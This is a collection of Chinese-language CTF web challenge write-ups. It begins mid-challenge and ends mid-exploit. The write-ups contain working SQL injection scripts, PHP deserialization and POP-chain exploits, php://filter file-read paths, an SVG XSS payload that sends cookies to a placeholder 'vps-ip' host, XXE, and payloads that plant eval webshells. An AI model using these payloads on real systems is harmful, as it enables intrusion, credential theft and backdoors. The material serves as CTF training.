mysqli_insert_id($con); mysqli_close($con); return $id; &#125; public function view_files($path)&#123; if ($this-&gt;ifview &#x3D;&#x3D; False)&#123; return False; &#x2F;&#x2F;The function is not yet perfect, it is not open yet. &#125; $content &#x3D; file_get_contents($path); echo $content; &#125; function __destruct()&#123; # Read some config html $this-&gt;view_files($this-&gt;config); &#125; &#125; 我们能看到helper里有个file_get_contents，而且path的值是config的内容 在show里还有个unserialize 可以看出这个题是反序列化，而我们的目的就是控制config里的内容 反序列化的部分很简单 &lt;?php class helper &#123; protected $ifview &#x3D; true; protected $config &#x3D; &quot;&#x2F;flag&quot;; &#125; $a &#x3D; new helper(); echo serialize($a); 但是我们要想办法把这个传进去 再来看把图片存入数据库的过程 那么正常的语句就应该是 INSERT INTO images (&#96;title&#96;,&#96;filename&#96;,&#96;ext&#96;,&#96;path&#96;,&#96;attr&#96;) VALUES(&#39;图片名称&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic&#x2F;f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;) 而title我们是可控的，所以我们构造的payload为 1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#.png 解释：看show里反序列化的部分，是只对attr部分进行了反序列化，所以我们在构造的时候，就要把我们的序列化语句放在attr的位置上，前边四个放1，并且用单引号来闭合前面的第一个单引号，#是为了注释后面的sql语句，保证顺利执行，.png是保证是个图片的后缀，让文件能传上去 而 0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d 是O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\\0\\0\\0ifview&quot;;b:1;s:9:&quot;\\0\\0\\0config&quot;;s:5:&quot;/flag&quot;;&#125;的十六进制形式，因为文件名不允许存在双引号，\\0是因为我们的序列化的两个属性都是protected类型的，而在储存时对protected序列化后出现的不可见字符与*的组合进行了替换，将chr(0)*chr(0)替换为了\\0\\0\\0，在反序列化时又换了回去，为了程序的执行，所以我们要将其替换 [RoarCTF 2019]Online Proxy一道像ssrf的页面，但实际上是xff头的二次注入 我们测试一下，先输入 1’ or ‘1 此时我们的current IP就等于它，然后我们再随便换一个其他的东西，只要和刚才那个不一样就可以，比如111，那么我们的current IP就成了：111，而last IP就是1’ or ‘1，此时1’ or &#39;1已经写入了数据库 .因为第一次和第二次传输的IP不一样，所以服务器并不会从数据库找last IP，它会把上次的IP（1’or ‘1）直接显示为last IP，让后存入数据库。那么我们再传一次111，因为和currnet IP相同，那么last IP就会从数据库里寻找，也就是会执行1’or‘1，结果为一。 所以直接跑脚本就行了 import requests url &#x3D; &#39;http:&#x2F;&#x2F;node4.buuoj.cn:28996&#x2F;&#39; flag &#x3D; &#39;&#39; for i in range(1, 100): length &#x3D; len(flag) min &#x3D; 32 max &#x3D; 125 while 1: j &#x3D; min + (max - min) &#x2F;&#x2F; 2 if min &#x3D;&#x3D; j: flag +&#x3D; chr(j) print(flag) break # 爆表 # payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;F4l9_D4t4B45e&#39;),%d,1))&lt;%d or &#39;0&quot;%(i,j) # 爆库 payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))&lt;%d or &#39;0&quot;%(i,j) # 爆列 # payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;F4l9_t4b1e&#39;),%d,1))&lt;%d or &#39;0&quot;%(i,j) # 爆flag #payload1 &#x3D; &quot;0&#39; or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),%d,1))&lt;%d or &#39;0&quot; % (i, j) payload2 &#x3D; &quot;1&quot; headers &#x3D; &#123;&quot;x-forwarded-for&quot;: payload1, &#39;Cookie&#39;: &#39;track_uuid&#x3D;585aabec-e6df-4724-95b8-8c2fa1285f61&#39;&#125; r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text # print(r) headers[&quot;x-forwarded-for&quot;] &#x3D; payload2 r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text # print(r) r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text # print(r) location &#x3D; r.find(&quot;Last Ip: &quot;) number &#x3D; r[location + 9:location + 10] if &#39;1&#39; in number: max &#x3D; j else: min &#x3D; j 最后出flag 赵总怎么还在里边夹私货（ [N1CTF 2018]eating_cms有注册界面register.php 注册一下登录之后感觉有点像伪协议 试一下，成功读到了源码 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;user 解码 user.php &lt;?php require_once(&quot;function.php&quot;); if( !isset( $_SESSION[&#39;user&#39;] ))&#123; Header(&quot;Location: index.php&quot;); &#125; if($_SESSION[&#39;isadmin&#39;] &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123; $oper_you_can_do &#x3D; $OPERATE_admin; &#125;else&#123; $oper_you_can_do &#x3D; $OPERATE; &#125; &#x2F;&#x2F;die($_SESSION[&#39;isadmin&#39;]); if($_SESSION[&#39;isadmin&#39;] &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123; if(!isset($_GET[&#39;page&#39;]) || $_GET[&#39;page&#39;] &#x3D;&#x3D;&#x3D; &#39;&#39;)&#123; $page &#x3D; &#39;info&#39;; &#125;else &#123; $page &#x3D; $_GET[&#39;page&#39;]; &#125; &#125; else&#123; if(!isset($_GET[&#39;page&#39;])|| $_GET[&#39;page&#39;] &#x3D;&#x3D;&#x3D; &#39;&#39;)&#123; $page &#x3D; &#39;guest&#39;; &#125;else &#123; $page &#x3D; $_GET[&#39;page&#39;]; if($page &#x3D;&#x3D;&#x3D; &#39;info&#39;) &#123; &#x2F;&#x2F; echo(&quot;&lt;script&gt;alert(&#39;no premission to visit info, only admin can, you are guest&#39;)&lt;&#x2F;script&gt;&quot;); Header(&quot;Location: user.php?page&#x3D;guest&quot;); &#125; &#125; &#125; filter_directory(); &#x2F;&#x2F;if(!in_array($page,$oper_you_can_do))&#123; &#x2F;&#x2F; $page &#x3D; &#39;info&#39;; &#x2F;&#x2F;&#125; include &quot;$page.php&quot;; ?&gt; function.php &lt;?php session_start(); require_once &quot;config.php&quot;; function Hacker() &#123; Header(&quot;Location: hacker.php&quot;); die(); &#125; function filter_directory() &#123; $keywords &#x3D; [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;]; $uri &#x3D; parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#39;query&#39;], $query); &#x2F;&#x2F; var_dump($query); &#x2F;&#x2F; die(); foreach($keywords as $token) &#123; foreach($query as $k &#x3D;&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125; &#125; function filter_directory_guest() &#123; $keywords &#x3D; [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;]; $uri &#x3D; parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#39;query&#39;], $query); &#x2F;&#x2F; var_dump($query); &#x2F;&#x2F; die(); foreach($keywords as $token) &#123; foreach($query as $k &#x3D;&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125; &#125; function Filter($string) &#123; global $mysqli; $blacklist &#x3D; &quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;; $whitelist &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;(),_*&#96;-@&#x3D;+&gt;&lt;&quot;; for ($i &#x3D; 0; $i &lt; strlen($string); $i++) &#123; if (strpos(&quot;$whitelist&quot;, $string[$i]) &#x3D;&#x3D;&#x3D; false) &#123; Hacker(); &#125; &#125; if (preg_match(&quot;&#x2F;$blacklist&#x2F;is&quot;, $string)) &#123; Hacker(); &#125; if (is_string($string)) &#123; return $mysqli-&gt;real_escape_string($string); &#125; else &#123; return &quot;&quot;; &#125; &#125; function sql_query($sql_query) &#123; global $mysqli; $res &#x3D; $mysqli-&gt;query($sql_query); return $res; &#125; function login($user, $pass) &#123; $user &#x3D; Filter($user); $pass &#x3D; md5($pass); $sql &#x3D; &quot;select * from &#96;albert_users&#96; where &#96;username_which_you_do_not_know&#96;&#x3D; &#39;$user&#39; and &#96;password_which_you_do_not_know_too&#96; &#x3D; &#39;$pass&#39;&quot;; echo $sql; $res &#x3D; sql_query($sql); &#x2F;&#x2F; var_dump($res); &#x2F;&#x2F; die(); if ($res-&gt;num_rows) &#123; $data &#x3D; $res-&gt;fetch_array(); $_SESSION[&#39;user&#39;] &#x3D; $data[username_which_you_do_not_know]; $_SESSION[&#39;login&#39;] &#x3D; 1; $_SESSION[&#39;isadmin&#39;] &#x3D; $data[isadmin_which_you_do_not_know_too_too]; return true; &#125; else &#123; return false; &#125; return; &#125; function updateadmin($level,$user) &#123; $sql &#x3D; &quot;update &#96;albert_users&#96; set &#96;isadmin_which_you_do_not_know_too_too&#96; &#x3D; &#39;$level&#39; where &#96;username_which_you_do_not_know&#96;&#x3D;&#39;$user&#39; &quot;; echo $sql; $res &#x3D; sql_query($sql); &#x2F;&#x2F; var_dump($res); &#x2F;&#x2F; die(); &#x2F;&#x2F; die($res); if ($res &#x3D;&#x3D; 1) &#123; return true; &#125; else &#123; return false; &#125; return; &#125; function register($user, $pass) &#123; global $mysqli; $user &#x3D; Filter($user); $pass &#x3D; md5($pass); $sql &#x3D; &quot;insert into &#96;albert_users&#96;(&#96;username_which_you_do_not_know&#96;,&#96;password_which_you_do_not_know_too&#96;,&#96;isadmin_which_you_do_not_know_too_too&#96;) VALUES (&#39;$user&#39;,&#39;$pass&#39;,&#39;0&#39;)&quot;; $res &#x3D; sql_query($sql); return $mysqli-&gt;insert_id; &#125; function logout() &#123; session_destroy(); Header(&quot;Location: index.php&quot;); &#125; ?&gt; 这里有个parse_url的解析漏洞（我记得我遇见过，但是不知道为什么没有写在wp上 $url0 &#x3D; &quot;&#x2F;baidu.com:80&quot;;&#x2F;&#x2F;全版本通杀，当url没协议时parse_url会直接报错 $url &#x3D; &quot;httpsadasd:&#x2F;&#x2F;www.baidu.com:80?a&#x3D;123&quot;; $url1 &#x3D; &quot;&#x2F;baidu.com:80a&quot;;&#x2F;&#x2F;但是在端口上加上字母就能正常解析 $url2 &#x3D; &quot;&#x2F;&#x2F;pupiles.com&#x2F;about:1234&quot;;&#x2F;&#x2F;这是php5.5以上的一个端口解析漏洞，这样的url会将&#x2F;后的内容都path看作path $url3 &#x3D; &quot;&#x2F;&#x2F;baidu.com:80a&quot;; var_dump(parse_url($url0)); var_dump(parse_url($url)); var_dump(parse_url($url1)); var_dump(parse_url($url2)); var_dump(parse_url($url3)); 返回的内容为 bool(false) array(4) &#123; [&quot;scheme&quot;]&#x3D;&gt; string(10) &quot;httpsadasd&quot; [&quot;host&quot;]&#x3D;&gt; string(13) &quot;www.baidu.com&quot; [&quot;port&quot;]&#x3D;&gt; int(80) [&quot;query&quot;]&#x3D;&gt; string(5) &quot;a&#x3D;123&quot; &#125; array(1) &#123; [&quot;path&quot;]&#x3D;&gt; string(14) &quot;&#x2F;baidu.com:80a&quot; &#125; array(3) &#123; [&quot;host&quot;]&#x3D;&gt; string(11) &quot;pupiles.com&quot; [&quot;port&quot;]&#x3D;&gt; int(1234) [&quot;path&quot;]&#x3D;&gt; string(11) &quot;&#x2F;about:1234&quot; &#125; array(2) &#123; [&quot;host&quot;]&#x3D;&gt; string(9) &quot;baidu.com&quot; [&quot;port&quot;]&#x3D;&gt; int(80) &#125; 测试 $url4 &#x3D; &quot;&#x2F;&#x2F;upload?&#x2F;test&#x2F;&quot;; $url5 &#x3D; &quot;&#x2F;upload?&#x2F;1&#x3D;1&amp;id&#x3D;1&quot;; $url6 &#x3D; &quot;&#x2F;&#x2F;&#x2F;upload?id&#x3D;1&quot;; var_dump(parse_url($url4)); var_dump(parse_url($url5)); var_dump(parse_url($url6)); 返回的内容为 array(2) &#123; [&quot;host&quot;]&#x3D;&gt; string(7) &quot;upload?&quot; [&quot;path&quot;]&#x3D;&gt; string(6) &quot;&#x2F;test&#x2F;&quot; &#125; array(2) &#123; [&quot;path&quot;]&#x3D;&gt; string(7) &quot;&#x2F;upload&quot; [&quot;query&quot;]&#x3D;&gt; string(9) &quot;&#x2F;1&#x3D;1&amp;id&#x3D;1&quot; &#125; bool(false) 这个就是我们需要的路径解析漏洞，这个在php的不同版本差别还是挺大的 5.2在参数带个伪协议直接解析不了。。。而且好像也没有这个洞和///直接报错的洞 5.4，5.5可以直接利用这个漏洞绕过 但是7.0开始好像是对参数里的：和/进行了检测 然后我们可以用 &#x2F;&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaaggg 或 &#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaaggg 读到ffffllllaaaaggg里的内容 解码之后 &lt;?php if (FLAG_SIG !&#x3D; 1)&#123; die(&quot;you can not visit it directly&quot;); &#125;else &#123; echo &quot;you can find sth in m4aaannngggeee&quot;; &#125; ?&gt; 那就再看m4aaannngggeee &lt;?php if (FLAG_SIG !&#x3D; 1)&#123; die(&quot;you can not visit it directly&quot;); &#125; include &quot;templates&#x2F;upload.html&quot;; ?&gt; 访问一下包含的这个文件 是个文件上传的页面 虽然没法传，但是跳转到了一个新的页面，再用伪协议读一下 upllloadddd.php &lt;?php $allowtype &#x3D; array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;); $size &#x3D; 10000000; $path &#x3D; &quot;.&#x2F;upload_b3bb2cfed6371dfeb2db1dbcceb124d3&#x2F;&quot;; $filename &#x3D; $_FILES[&#39;file&#39;][&#39;name&#39;]; if(is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]))&#123; if(!move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$path.$filename))&#123; die(&quot;error:can not move&quot;); &#125; &#125;else&#123; die(&quot;error:not an upload file！&quot;); &#125; $newfile &#x3D; $path.$filename; echo &quot;file upload success&lt;br &#x2F;&gt;&quot;; echo $filename; $picdata &#x3D; system(&quot;cat .&#x2F;upload_b3bb2cfed6371dfeb2db1dbcceb124d3&#x2F;&quot;.$filename.&quot; | base64 -w 0&quot;); echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;png;base64,&quot;.$picdata.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;; if($_FILES[&#39;file&#39;][&#39;error&#39;]&gt;0)&#123; unlink($newfile); die(&quot;Upload file error: &quot;); &#125; $ext &#x3D; array_pop(explode(&quot;.&quot;,$_FILES[&#39;file&#39;][&#39;name&#39;])); if(!in_array($ext,$allowtype))&#123; unlink($newfile); &#125; ?&gt; 看这句，如果我们再filename处插入命令，就可以执行它 那我们就去找真正的文件上传的页面，想到之前的m4aaannngggeee 利用分号执行多个注释，然后利用井号注释掉后面的语句 [网鼎杯 2020 半决赛]AliceWebsite额。。。 看下载的附件里的index.php，有一个action可以进行文件包含，实现任意文件读取，然后就是直接猜flag文件名为flag，在根目录就行 [极客大挑战 2020]Roamphp1-Welcome挺有意思的一个题，但是没什么难度 打开环境的时候405还以为是环境有问题，但是这里状态码是405，也就是请求方式错误，抓包改一下请求方式就能看见php代码了 然后就是考烂了的md5的绕过，在phpinfo里有flag [HarekazeCTF2019]Avatar Uploader 源码里主要看这三个地方，其他的都不重要 在检查文件类型时，finfo_file()函数检测上传图片的类型是否是image/png在检查文件长宽时，getimagesize() 函数用于获取图像大小及相关信息，成功将返回一个数组 我们的目的就是让最后的那个if满足 也就是让getimagesize() 函数识别不出上传的为png文件 因为finfo_file()可以识别png图片十六进制下的第一行，而 getimagesize 不可以。所以只要保持png头破坏掉文件长宽等其余信息就能绕过了 然后上传就可以了 [BSidesCF 2019]SVGMagic做这个题之前要先看一下SVG是什么 SVG简介 SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg&#x2F;png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。 创建 SVG 图像SVG 文档基本结构 如下所示，是一个 SVG 文档结构： &lt;svg width&#x3D;&#39;140&#39; heiight&#x3D;&#39;170&#39; xmlns&#x3D;&#39;http:&#x2F;&#x2F;wwww.w3.org&#x2F;2000&#x2F;svg&#39;&gt; &lt;title&gt;Cat&lt;&#x2F;title&gt; &lt;desc&gt;Stick Figure of Cat&lt;&#x2F;desc&gt; &lt;!-- 在这里绘制图像 --&gt; &lt;&#x2F;svg&gt; 根元素&lt;svg&gt;以像素为单位定义了整个图像的 width 和 height，还通过 xmlns 属性定义了 SVG 的命名空间。&lt;title&gt; 元素的内容可以被阅读器显示在标题栏上或者是作为鼠标指针指向图像时的提示， &lt;desc&gt; 元素允许咱们为图像定义完整的描述信息。 基本形状和属性 基本图形 &lt;rect&gt;、&lt;circle&gt;、&lt;ellipse&gt;、&lt;line&gt;、&lt;polyline&gt;、&lt;polygon&gt; 基本属性 fill、stroke、stroke-width、transform 基本形状 --- 圆形 SVG造成XSS 但是如果我们在这里插入一个xss 可以看到也能执行 原因 这是因为SVG是支持通过脚本语言来动态访问和修改SVG的任何内容，这点和HTML中的DOM类似，或者说完全一致。因为SVG中的所有标签和属性都已经对应了已经定义的DOM，而这种脚本语言就是JavaScript，所以我们在SVG中插入JavaScript脚本是完全能够被解析的。 在国际的SVG标准中定义了script标签的存在，总之XSS之所以能够执行是因为遵循了svg及xml的标准。 所以可以用 &lt;svg/onload=&quot;document.location=&#39;http://vps-ip:1234&#39;+document.cookie&quot;&gt; 这种payload实现盗取管理员cookie的目的 SVG造成XXE 因为SVG是一种用XML定义的语言 所以这个也存在着xxe的漏洞 这里就会返回一个带着passwd文件内容的图片，可以通过修改图片宽度来看后边的部分 后边就是猜flag文件的部分了，flag文件名为flag.txt，且在当前目录，但是我们不知道我们当前的目录 这里可以用/proc/self/cwd来获取目标当前进程环境的运行目录与目录里的文件 所以最终的payload为 参考文章： 浅谈SVG的两个黑魔法_合天网安实验室的博客-CSDN博客 [WMCTF2020]Make PHP Great Again&lt;?php highlight_file(__FILE__); require_once &#39;flag.php&#39;; if(isset($_GET[&#39;file&#39;])) &#123; require_once $_GET[&#39;file&#39;]; &#125; 这题的考点就是require_once的绕过，这个函数所包含的文件只能被包含一次，这样的话我们就不能直接用伪协议来再包含一次flag.php了 php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once(&#39;flag.php&#39;)，已经include的文件不可以再require_once。 在这里有个小知识点，/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload: php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php 但是这个需要知道当前目录，我们可以根据上一题提到的知识改进一下 php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.php 原理可以去看这个 php源码分析 require_once 绕过不能重复包含文件的限制 - 安全客，安全资讯平台 (anquanke.com) [FireshellCTF2020]Caas开局一个大输入框 要求我们输入代码进行编辑，看报错能猜出来这是c的文件 然后是利用了#include &quot;&quot;预处理编译报错 通过报错可以把include的文件内容输出出来 October 2019 Twice SQL Injection这个二次注入就是在注册的时候把注入语句作为username就行 其他的功能基本上没啥用 username &#x3D;1&#39; union select database() # username &#x3D;1&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39; # username &#x3D;1&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;# &#x2F;*这里可以直接 username &#x3D;1&#39; union select * from flag # *&#x2F; username &#x3D;1&#39; union select flag from flag # [SUCTF 2018]MultiSQLsql的预处理 这里有两个注入点 一个是注册的地方对用户名有一个过滤，应该是可以二次注入的 还一个是在登录后的id的位置，有个数字型的盲注，这个还能造成越权访问，不过没啥用 题目本身有一些过滤，用id=1^(if(ascii(mid(user(),1,1))&gt;0,0,1))异或的方式来判断注入点 这里呢过滤了union，select ，&amp;，| 不过flag也不在数据库里，这里是要求用outfile写文件进去，可写的路径是/var/www/html/favicon/目录下，这是因为有个修改头像的功能，上传的头像就在这个目录下 不想写了，偷个代码 str&#x3D;&quot;select &#39;&lt;?php eval($_POST[_]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;;&quot; len_str&#x3D;len(str) for i in range(0,len_str): if i &#x3D;&#x3D; 0: print(&#39;char(%s&#39;%ord(str[i]),end&#x3D;&quot;&quot;) else: print(&#39;,%s&#39;%ord(str[i]),end&#x3D;&quot;&quot;) print(&#39;)&#39;) 然后借助堆叠注入和预处理方式 最终payload为 ?id&#x3D;1;set @sql&#x3D;char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query; [EIS 2019]EzPOP好难的链子，做这个之前本来以为自己的反序列化水平还可以了，不过现在看起来也就那样了hhhh &lt;?php error_reporting(0); class A &#123; protected $store; protected $key; protected $expire; public function __construct($store, $key &#x3D; &#39;flysystem&#39;, $expire &#x3D; null) &#123; $this-&gt;key &#x3D; $key; $this-&gt;store &#x3D; $store; $this-&gt;expire &#x3D; $expire; &#125; public function cleanContents(array $contents) &#123; $cachedProperties &#x3D; array_flip([ &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;, &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;, ]); foreach ($contents as $path &#x3D;&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] &#x3D; array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents; &#125; public function getForStorage() &#123; $cleaned &#x3D; $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); &#125; public function save() &#123; $contents &#x3D; $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (!$this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125; &#125; class B &#123; protected function getExpireTime($expire): int &#123; return (int) $expire; &#125; public function getCacheKey(string $name): string &#123; return $this-&gt;options[&#39;prefix&#39;] . $name; &#125; protected function serialize($data): string &#123; if (is_numeric($data)) &#123; return (string) $data; &#125; $serialize &#x3D; $this-&gt;options[&#39;serialize&#39;]; return $serialize($data); &#125; public function set($name, $value, $expire &#x3D; null): bool&#123; $this-&gt;writeTimes++; if (is_null($expire)) &#123; $expire &#x3D; $this-&gt;options[&#39;expire&#39;]; &#125; $expire &#x3D; $this-&gt;getExpireTime($expire); $filename &#x3D; $this-&gt;getCacheKey($name); $dir &#x3D; dirname($filename); if (!is_dir($dir)) &#123; try &#123; mkdir($dir, 0755, true); &#125; catch (\\Exception $e) &#123; &#x2F;&#x2F; 创建失败 &#125; &#125; $data &#x3D; $this-&gt;serialize($value); if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123; &#x2F;&#x2F;数据压缩 $data &#x3D; gzcompress($data, 3); &#125; $data &#x3D; &quot;&lt;?php\\n&#x2F;&#x2F;&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result &#x3D; file_put_contents($filename, $data); if ($result) &#123; return true; &#125; return false; &#125; &#125; if (isset($_GET[&#39;src&#39;])) &#123; highlight_file(__FILE__); &#125; $dir &#x3D; &quot;uploads&#x2F;&quot;; if (!is_dir($dir)) &#123; mkdir($dir); &#125; unserialize($_GET[&quot;data&quot;]); 利用点是很明显的 B类里的set方法里调用了一个file_put_contents，然后两个参数在一定程度上是可控的，所以我们可以利用这个来写马 我们先来看data参数 可以看到data参数在将value参数作为serialize方法的参数调用后，将serialize方法的返回值进行了拼接，最终成为了我们写入的内容 这里是serizalize方法的内容 就是将serialize赋成一个函数，再执行一下将其返回 这里我们可以让options[&#39;serialize&#39;]=trim，这样返回的值只会去掉首尾的空格，内容不变 所以这里data的值就是$value，而$value是作为set方法里的一个参数出现的 另外要注意别让数据压缩 也就是让$this-&gt;options[&#39;data_compress&#39;] = false; 而要调用set方法就要看A类里的save方法了 然后这里还调用了getForStorage，将getForStorage的返回值当作$contents，也就是set中的$value，getForStorage中还通过cleanContents来对cleaned的值进行了过滤 在这里可以令cache=array()，这样就能保证contents的仅仅是complete这个变量的内容了 而为了实现调用save参数的目的，我们要看反序列化的入口 让autosave=false 经过上面的分析，我们已知的要定义的内容有 autosave&#x3D;false complete&#x3D;payload cache&#x3D;array() options[&#39;serialize&#39;]&#x3D;trim $this-&gt;store &#x3D; new B() $this-&gt;options[&#39;data_compress&#39;] &#x3D; false; 然后再来看filename部分 filename是经过getCacheKey函数拼接后的结果，我们可以让 options[&#39;prefix&#39;]=shell 然后让name=.php，一样可以达到写入php马的目的 接下来就要看name的来源了 这同样是set的一个形参，是A类中key变量的值，我们可以直接对其赋值 这部分我们定义的参数可以为 options[&#39;prefix&#39;]&#x3D;shell key &#x3D; .php 调试一下可以看到我们的链子是正确的 然后我们需要做的部分是绕过data里的exit()函数，因为 $data = &quot;&lt;?php\\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; 这个格式化输出固定了长度为12的数值，不能写入我们的shell 这里就要利用p牛讲过的利用伪协议的base64破坏原有的php内容的方式了 由于&lt;、?、()、;、&gt;、\\n都不是base64编码的范围，所以base64解码的时候会自动将其忽略，所以解码之后就剩phpexit了，但是呢base64算法解码时是4个字节一组，所以我们还需要在前面加个字符 在本题里就是php//exit加上中间格式化的12个字符共21个 我们先让 options[&#39;prefix&#39;] &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;&#39; 这样就会令写入的内容进行base64的解码 然后让 complete &#x3D; &quot;xxxPD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+&quot; &#x2F;&#x2F;xxx&lt;?php @eval($_POST[&quot;a&quot;]);?&gt; 本地尝试一下可以成功写入 然后执行命令就可以了 exp &lt;?php error_reporting(0); class A &#123; protected $store; protected $key; protected $expire; public function __construct() &#123; $this-&gt;key &#x3D; &#39;shell.php&#39;; $this-&gt;store &#x3D; new B();; $this-&gt;expire &#x3D; 0; $this -&gt; autosave &#x3D; false; $this -&gt; complete &#x3D; &#39;xxxPD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+&#39;; $this -&gt; cache &#x3D; array(); &#125; &#125; class B &#123; public $options &#x3D; array(); function __construct() &#123; $this-&gt;options[&#39;serialize&#39;] &#x3D; &#39;trim&#39;; $this-&gt;options[&#39;prefix&#39;] &#x3D; 